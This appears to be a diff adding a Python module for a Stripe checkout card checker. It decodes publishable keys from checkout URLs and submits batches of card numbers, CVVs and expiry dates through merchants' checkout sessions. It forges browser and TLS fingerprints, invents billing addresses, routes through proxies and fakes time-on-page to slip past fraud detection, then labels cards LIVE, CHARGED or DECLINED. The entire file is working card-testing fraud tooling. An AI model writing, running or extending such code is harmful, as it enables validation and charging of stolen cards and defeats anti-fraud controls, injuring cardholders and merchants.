@@ -1,0 +1,443 @@
+import re
+import time
+import random
+import asyncio
+import aiohttp
+import base64
+from urllib.parse import unquote
+
+from curl_cffi.requests import AsyncSession as CurlSession
+
+from utils.constants import (
+    USER_AGENTS, TLS_PROFILES, BILLING_ADDRESSES, LIVE_DECLINE_CODES,
+    get_random_billing, get_currency_symbol, get_random_browser_profile,
+)
+from utils.stripe import (
+    get_stripe_headers, generate_stripe_fingerprints,
+    generate_eid, get_stripe_cookies, get_random_stripe_js_agent,
+)
+from utils.proxy import get_proxy_url
+
+
+def extract_checkout_url(text: str) -> str:
+    """Extract a Stripe checkout URL from text."""
+    patterns = [
+        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
+        r'https?://checkout\.stripe\.com/[^\s\"\'\<\>\)]+',
+        r'https?://buy\.stripe\.com/[^\s\"\'\<\>\)]+',
+    ]
+    for p in patterns:
+        m = re.search(p, text, re.IGNORECASE)
+        if m:
+            url = m.group(0).rstrip('.,;:')
+            return url
+    return None
+
+
+async def fetch_pk_from_page(url: str) -> str:
+    """Fetch checkout page HTML and extract PK via regex (fallback method)."""
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, headers={
+                "User-Agent": random.choice(USER_AGENTS),
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5"
+            }, timeout=aiohttp.ClientTimeout(total=15),
+            allow_redirects=True, ssl=False) as resp:
+                if resp.status == 200:
+                    html = await resp.text()
+                    pk_patterns = [
+                        r'pk_(live|test)_[A-Za-z0-9]{20,}',
+                        r'"apiKey"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]+)"',
+                        r'"publishableKey"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]+)"',
+                        r'Stripe\(["\']?(pk_(?:live|test)_[A-Za-z0-9]+)["\']?\)',
+                    ]
+                    for pattern in pk_patterns:
+                        pk_match = re.search(pattern, html)
+                        if pk_match:
+                            pk = pk_match.group(1) if pk_match.lastindex else pk_match.group(0)
+                            if pk.startswith('pk_'):
+                                print(f"[DEBUG] PK extracted from page HTML: {pk[:20]}...")
+                                return pk
+    except Exception as e:
+        print(f"[DEBUG] fetch_pk_from_page error: {str(e)[:50]}")
+    return None
+
+
+async def decode_pk_from_url(url: str) -> dict:
+    """Extract PK, CS, and site from a Stripe checkout URL."""
+    result = {"pk": None, "cs": None, "site": None}
+
+    try:
+        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
+        if cs_match:
+            result["cs"] = cs_match.group(0)
+
+        # Method 1: Decode from hash fragment (XOR decode)
+        if '#' in url:
+            hash_part = url.split('#')[1]
+            hash_decoded = unquote(hash_part)
+
+            try:
+                padded = hash_decoded + '=' * (-len(hash_decoded) % 4)
+                decoded_bytes = base64.b64decode(padded)
+                xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
+
+                pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
+                if pk_match:
+                    result["pk"] = pk_match.group(0)
+                    print(f"[DEBUG] PK decoded from hash: {result['pk'][:20]}...")
+
+                site_match = re.search(r'https?://[^\s\"\'\'<>]+', xored)
+                if site_match:
+                    result["site"] = site_match.group(0)
+            except (ValueError, Exception) as e:
+                print(f"[DEBUG] Hash decode error: {str(e)[:40]}")
+
+        # Method 2: Fallback — fetch page HTML and extract PK
+        if not result["pk"] and result["cs"]:
+            print(f"[DEBUG] Hash decode failed/missing, trying page fetch fallback...")
+            pk_from_page = await fetch_pk_from_page(url)
+            if pk_from_page:
+                result["pk"] = pk_from_page
+
+    except Exception as e:
+        print(f"[DEBUG] decode_pk_from_url error: {str(e)[:50]}")
+
+    return result
+
+
+async def get_checkout_info(url: str) -> dict:
+    """Get full checkout info from a Stripe checkout URL."""
+    start = time.perf_counter()
+    result = {
+        "url": url,
+        "pk": None,
+        "cs": None,
+        "merchant": None,
+        "price": None,
+        "currency": None,
+        "product": None,
+        "country": None,
+        "mode": None,
+        "customer_name": None,
+        "customer_email": None,
+        "support_email": None,
+        "support_phone": None,
+        "cards_accepted": None,
+        "success_url": None,
+        "cancel_url": None,
+        "init_data": None,
+        "error": None,
+        "time": 0
+    }
+
+    try:
+        decoded = await decode_pk_from_url(url)
+        result["pk"] = decoded.get("pk")
+        result["cs"] = decoded.get("cs")
+
+        if result["pk"] and result["cs"]:
+            bp = get_random_browser_profile()
+            eid = generate_eid()
+            body = f"key={result['pk']}&eid={eid}&browser_locale=en-US&redirect_type=url"
+
+            async with CurlSession(impersonate=bp['tls']) as s:
+                r = await s.post(
+                    f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
+                    headers=get_stripe_headers(),
+                    data=body,
+                    timeout=20
+                )
+                init_data = r.json()
+
+            if "error" not in init_data:
+                result["init_data"] = init_data
+
+                acc = init_data.get("account_settings", {})
+                result["merchant"] = acc.get("display_name") or acc.get("business_name")
+                result["support_email"] = acc.get("support_email")
+                result["support_phone"] = acc.get("support_phone")
+                result["country"] = acc.get("country")
+
+                lig = init_data.get("line_item_group")
+                inv = init_data.get("invoice")
+                if lig:
+                    result["price"] = lig.get("total", 0) / 100
+                    result["currency"] = lig.get("currency", "").upper()
+                    if lig.get("line_items"):
+                        items = lig["line_items"]
+                        currency = lig.get("currency", "").upper()
+                        sym = get_currency_symbol(currency)
+                        product_parts = []
+                        for item in items:
+                            qty = item.get("quantity", 1)
+                            name = item.get("name", "Product")
+                            amt = item.get("amount", 0) / 100
+                            interval = item.get("recurring_interval")
+                            if interval:
+                                product_parts.append(f"{qty} × {name} (at {sym}{amt:.2f} / {interval})")
+                            else:
+                                product_parts.append(f"{qty} × {name} ({sym}{amt:.2f})")
+                        result["product"] = ", ".join(product_parts)
+                elif inv:
+                    result["price"] = inv.get("total", 0) / 100
+                    result["currency"] = inv.get("currency", "").upper()
+
+                mode = init_data.get("mode", "")
+                if mode:
+                    result["mode"] = mode.upper()
+                elif init_data.get("subscription"):
+                    result["mode"] = "SUBSCRIPTION"
+                else:
+                    result["mode"] = "PAYMENT"
+
+                cust = init_data.get("customer") or {}
+                result["customer_name"] = cust.get("name")
+                result["customer_email"] = init_data.get("customer_email") or cust.get("email")
+
+                pm_types = init_data.get("payment_method_types") or []
+                if pm_types:
+                    cards = [t.upper() for t in pm_types if t != "card"]
+                    if "card" in pm_types:
+                        cards.insert(0, "CARD")
+                    result["cards_accepted"] = ", ".join(cards) if cards else "CARD"
+
+                result["success_url"] = init_data.get("success_url")
+                result["cancel_url"] = init_data.get("cancel_url")
+            else:
+                result["error"] = init_data.get("error", {}).get("message", "Init failed")
+        else:
+            result["error"] = "Could not decode PK/CS from URL"
+
+    except Exception as e:
+        result["error"] = str(e)
+        print(f"[DEBUG] get_checkout_info error: {str(e)[:50]}")
+
+    result["time"] = round(time.perf_counter() - start, 2)
+    return result
+
+
+async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, user_id: int = None, max_retries: int = 2, session_ctx: dict = None, card_index: int = 0) -> dict:
+    """Charge card using Stripe.js emulation — direct confirm with fingerprints.
+    
+    Args:
+        session_ctx: Session context from generate_session_context(). 
+                     If provided, uses consistent TLS/fingerprints for the whole session.
+        card_index: Index of this card in the batch (0-based), used for time_on_page.
+    """
+    start = time.perf_counter()
+    card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
+    result = {
+        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
+        "status": None,
+        "response": None,
+        "time": 0
+    }
+
+    pk = checkout_data.get("pk")
+    cs = checkout_data.get("cs")
+    init_data = checkout_data.get("init_data")
+
+    if not pk or not cs or not init_data:
+        result["status"] = "FAILED"
+        result["response"] = "No checkout data"
+        result["time"] = round(time.perf_counter() - start, 2)
+        return result
+
+    print(f"\n[DEBUG] Card: {card_display}")
+
+    # Use session context if provided, otherwise fallback to per-card generation
+    if session_ctx:
+        profile = session_ctx["tls_profile"]
+        fp = session_ctx["fingerprints"]
+        stripe_cookies = session_ctx["cookies"]
+        pua = session_ctx["payment_user_agent"]
+        pasted = session_ctx["pasted_fields"]
+        # Time on page increases naturally per card (user spends more time)
+        time_on_page = session_ctx["time_on_page_base"] + (card_index * random.randint(3000, 8000))
+    else:
+        from utils.stripe import generate_session_context as _gen_ctx
+        _ctx = _gen_ctx(user_id)
+        profile = _ctx["tls_profile"]
+        fp = _ctx["fingerprints"]
+        stripe_cookies = _ctx["cookies"]
+        pua = _ctx["payment_user_agent"]
+        pasted = _ctx["pasted_fields"]
+        time_on_page = _ctx["time_on_page_base"]
+
+    for attempt in range(max_retries + 1):
+        try:
+            proxy_url = get_proxy_url(proxy_str) if proxy_str else None
+            async with CurlSession(impersonate=profile) as s:
+                email = init_data.get("customer_email") or "john@example.com"
+                checksum = init_data.get("init_checksum", "")
+
+                lig = init_data.get("line_item_group")
+                inv = init_data.get("invoice")
+                if lig:
+                    total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
+                elif inv:
+                    total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
+                else:
+                    pi = init_data.get("payment_intent") or {}
+                    total = subtotal = pi.get("amount", 0)
+
+                cust = init_data.get("customer") or {}
+                addr = cust.get("address") or {}
+
+                # Use customer data if available, otherwise random billing
+                if cust.get("name") or addr.get("line1"):
+                    name = cust.get("name") or "John Smith"
+                    country = addr.get("country") or "US"
+                    line1 = addr.get("line1") or "742 Evergreen Terrace"
+                    city = addr.get("city") or "Springfield"
+                    state = addr.get("state") or "IL"
+                    zip_code = addr.get("postal_code") or "62704"
+                else:
+                    billing = get_random_billing()
+                    name = billing["name"]
+                    country = billing["country"]
+                    line1 = billing["line1"]
+                    city = billing["city"]
+                    state = billing["state"]
+                    zip_code = billing["zip"]
+
+                if attempt > 0:
+                    print(f"[DEBUG] Retry attempt {attempt}...")
+
+                # Only eid changes per card (unique per request)
+                eid = generate_eid()
+
+                print(f"[DEBUG] TLS Profile: {profile} | Confirming with fingerprints...")
+
+                # Build confirm body — Stripe.js style with full card data + fingerprints
+                conf_body = (
+                    f"eid={eid}"
+                    f"&payment_method_data[type]=card"
+                    f"&payment_method_data[card][number]={card['cc']}"
+                    f"&payment_method_data[card][cvc]={card['cvv']}"
+                    f"&payment_method_data[card][exp_month]={card['month']}"
+                    f"&payment_method_data[card][exp_year]={card['year']}"
+                    f"&payment_method_data[billing_details][name]={name}"
+                    f"&payment_method_data[billing_details][email]={email}"
+                    f"&payment_method_data[billing_details][address][country]={country}"
+                    f"&payment_method_data[billing_details][address][line1]={line1}"
+                    f"&payment_method_data[billing_details][address][city]={city}"
+                    f"&payment_method_data[billing_details][address][postal_code]={zip_code}"
+                    f"&payment_method_data[billing_details][address][state]={state}"
+                    f"&payment_method_data[guid]={fp['guid']}"
+                    f"&payment_method_data[muid]={fp['muid']}"
+                    f"&payment_method_data[sid]={fp['sid']}"
+                    f"&payment_method_data[payment_user_agent]={pua}"
+                    f"&payment_method_data[time_on_page]={time_on_page}"
+                )
+                # Add pasted_fields only if not empty
+                if pasted:
+                    conf_body += f"&payment_method_data[pasted_fields]={pasted}"
+                conf_body += (
+                    f"&expected_amount={total}"
+                    f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
+                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
+                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
+                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
+                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
+                    f"&expected_payment_method_type=card"
+                    f"&key={pk}"
+                    f"&init_checksum={checksum}"
+                    f"&_stripe_version=2025-02-24.acacia"
+                )
+
+                # Use curl_cffi headers + matched UA + Stripe cookies
+                headers = get_stripe_headers()
+                headers["cookie"] = stripe_cookies
+                # Set UA from session context to match TLS profile
+                if session_ctx and session_ctx.get("user_agent"):
+                    headers["user-agent"] = session_ctx["user_agent"]
+
+                r = await s.post(
+                    f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
+                    headers=headers,
+                    data=conf_body,
+                    proxy=proxy_url,
+                    timeout=25
+                )
+                conf = r.json()
+
+                print(f"[DEBUG] Confirm Response: {str(conf)[:200]}...")
+
+                if "error" in conf:
+                    err = conf["error"]
+                    dc = err.get("decline_code", "")
+                    msg = err.get("message", "Failed")
+                    err_code = err.get("code", "")
+
+                    # Check if session is expired/inactive/canceled/already paid
+                    if err_code in ('checkout_not_active_session', 'payment_intent_unexpected_state', 'checkout_succeeded_session') or 'no longer active' in msg.lower() or 'status of canceled' in msg.lower() or 'already been processed' in msg.lower():
+                        result["status"] = "SESSION_EXPIRED"
+                    # Check if decline code indicates card is LIVE
+                    elif dc in LIVE_DECLINE_CODES:
+                        result["status"] = "LIVE"
+                    else:
+                        result["status"] = "DECLINED"
+                    if dc:
+                        result["response"] = f"[{dc}] [{msg}]"
+                    elif err_code:
+                        result["response"] = f"[{err_code}] [{msg}]"
+                    else:
+                        result["response"] = msg
+                    print(f"[DEBUG] Decline: {dc or err_code} - {msg}")
+                else:
+                    pi = conf.get("payment_intent") or {}
+                    st = pi.get("status", "") or conf.get("status", "")
+                    if st == "succeeded":
+                        result["status"] = "CHARGED"
+                        result["response"] = "Payment Successful"
+                    elif st == "requires_action":
+                        result["status"] = "3DS"
+                        result["response"] = "3DS Skipped"
+                    elif st == "requires_payment_method":
+                        result["status"] = "DECLINED"
+                        result["response"] = "Card Declined"
+                    else:
+                        result["status"] = "UNKNOWN"
+                        result["response"] = st or "Unknown"
+
+                result["time"] = round(time.perf_counter() - start, 2)
+                print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
+                return result
+
+        except Exception as e:
+            err_str = str(e)
+            print(f"[DEBUG] ❌ Error: {err_str[:50]}")
+            if attempt < max_retries and ("disconnect" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower()):
+                print(f"[DEBUG] Retrying in 1s...")
+                await asyncio.sleep(1)
+                continue
+            result["status"] = "ERROR"
+            result["response"] = err_str[:50]
+            result["time"] = round(time.perf_counter() - start, 2)
+            print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
+            return result
+
+    return result
+
+
+async def check_checkout_active(pk: str, cs: str) -> bool:
+    """Check if a checkout session is still active."""
+    try:
+        bp = get_random_browser_profile()
+        eid = generate_eid()
+        body = f"key={pk}&eid={eid}&browser_locale=en-US&redirect_type=url"
+        async with CurlSession(impersonate=bp['tls']) as s:
+            r = await s.post(
+                f"https://api.stripe.com/v1/payment_pages/{cs}/init",
+                headers=get_stripe_headers(),
+                data=body,
+                timeout=5
+            )
+            data = r.json()
+            return "error" not in data
+    except Exception as e:
+        print(f"[DEBUG] check_checkout_active error: {str(e)[:40]}")
+        return False
